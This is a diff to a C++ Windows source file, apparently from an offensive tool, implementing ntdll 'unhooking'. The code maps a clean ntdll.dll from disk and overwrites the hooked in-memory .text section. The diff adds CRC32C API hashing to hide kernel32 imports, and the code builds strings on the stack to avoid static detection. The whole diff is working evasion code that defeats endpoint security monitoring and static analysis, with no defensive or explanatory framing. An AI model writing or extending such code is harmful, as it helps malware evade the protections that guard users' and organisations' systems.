@@ -9,33 +9,66 @@
 // 
 
 #include "Unhook.h"
+#include "ApiResolver.h"
+
+// Local CRC32C hash constants for kernel32 functions used in this file
+// Computed via Crc32C::ConstHash (polynomial 0x82F63B78)
+namespace {
+    constexpr DWORD HASH_CRC_CREATEFILEA        = 0xA1B83AEB;
+    constexpr DWORD HASH_CRC_CREATEFILEMAPPINGA  = 0x13252564;
+    constexpr DWORD HASH_CRC_MAPVIEWOFFILE       = 0x7B345594;
+    constexpr DWORD HASH_CRC_UNMAPVIEWOFFILE     = 0x2264C6B5;
+    constexpr DWORD HASH_CRC_CLOSEHANDLE         = 0x2E67D349;
+    constexpr DWORD HASH_CRC_VIRTUALPROTECT      = 0xF8ADA5AC;
+}
 
 namespace Unhook
 {
     bool RefreshNtdll()
     {
+        // Динамическое разрешение kernel32 функций через CRC32C
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return false;
+
+        typedef HANDLE (WINAPI* pfnCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+        typedef HANDLE (WINAPI* pfnCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
+        typedef LPVOID (WINAPI* pfnMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
+        typedef BOOL   (WINAPI* pfnUnmapViewOfFile)(LPCVOID);
+        typedef BOOL   (WINAPI* pfnCloseHandle)(HANDLE);
+        typedef BOOL   (WINAPI* pfnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+
+        pfnCreateFileA        pCreateFileA        = (pfnCreateFileA)Api::GetProcByHashCrc(hK32, HASH_CRC_CREATEFILEA);
+        pfnCreateFileMappingA pCreateFileMappingA = (pfnCreateFileMappingA)Api::GetProcByHashCrc(hK32, HASH_CRC_CREATEFILEMAPPINGA);
+        pfnMapViewOfFile      pMapViewOfFile      = (pfnMapViewOfFile)Api::GetProcByHashCrc(hK32, HASH_CRC_MAPVIEWOFFILE);
+        pfnUnmapViewOfFile    pUnmapViewOfFile    = (pfnUnmapViewOfFile)Api::GetProcByHashCrc(hK32, HASH_CRC_UNMAPVIEWOFFILE);
+        pfnCloseHandle        pCloseHandle        = (pfnCloseHandle)Api::GetProcByHashCrc(hK32, HASH_CRC_CLOSEHANDLE);
+        pfnVirtualProtect     pVirtualProtect     = (pfnVirtualProtect)Api::GetProcByHashCrc(hK32, HASH_CRC_VIRTUALPROTECT);
+
+        if (!pCreateFileA || !pCreateFileMappingA || !pMapViewOfFile ||
+            !pUnmapViewOfFile || !pCloseHandle || !pVirtualProtect)
+            return false;
+
         // 1. Build path on stack (no static strings)
         char path[] = { 'C',':','\\','W','i','n','d','o','w','s','\\',
                         'S','y','s','t','e','m','3','2','\\',
                         'n','t','d','l','l','.','d','l','l', 0 };
 
         // 2. Open ntdll from disk (read-only, no admin needed)
-        HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
+        HANDLE hFile = pCreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
             NULL, OPEN_EXISTING, 0, NULL);
         if (hFile == INVALID_HANDLE_VALUE) return false;
 
         // 3. Create file mapping
-        HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
-        if (!hMapping) { CloseHandle(hFile); return false; }
+        HANDLE hMapping = pCreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
+        if (!hMapping) { pCloseHandle(hFile); return false; }
 
         // 4. Map view of the clean file
-        LPVOID pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
-        if (!pClean) { CloseHandle(hMapping); CloseHandle(hFile); return false; }
+        LPVOID pClean = pMapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
+        if (!pClean) { pCloseHandle(hMapping); pCloseHandle(hFile); return false; }
 
-        // 5. Get handle to the in-memory (hooked) ntdll (stack-built)
-        char ntStr[] = { 'n','t','d','l','l','.','d','l','l', 0 };
-        HMODULE hNtdll = GetModuleHandleA(ntStr);
-        if (!hNtdll) { UnmapViewOfFile(pClean); CloseHandle(hMapping); CloseHandle(hFile); return false; }
+        // 5. Get handle to the in-memory (hooked) ntdll
+        HMODULE hNtdll = Api::GetModuleByHashCrc(Api::CrcMod::NTDLL);
+        if (!hNtdll) { pUnmapViewOfFile(pClean); pCloseHandle(hMapping); pCloseHandle(hFile); return false; }
 
         // 6. Parse PE headers of the clean copy to find .text section
         PIMAGE_DOS_HEADER cleanDos = (PIMAGE_DOS_HEADER)pClean;
@@ -55,21 +88,21 @@ namespace Unhook
 
                 // 7. Make hooked .text writable (own process, no admin)
                 DWORD oldProtect;
-                VirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+                pVirtualProtect(hookedText, textSize, PAGE_EXECUTE_READWRITE, &oldProtect);
 
                 // 8. Overwrite hooked code with clean code
                 memcpy(hookedText, cleanText, textSize);
 
                 // 9. Restore original protection
-                VirtualProtect(hookedText, textSize, oldProtect, &oldProtect);
+                pVirtualProtect(hookedText, textSize, oldProtect, &oldProtect);
                 break;
             }
         }
 
         // 10. Cleanup
-        UnmapViewOfFile(pClean);
-        CloseHandle(hMapping);
-        CloseHandle(hFile);
+        pUnmapViewOfFile(pClean);
+        pCloseHandle(hMapping);
+        pCloseHandle(hFile);
         return true;
     }
 }
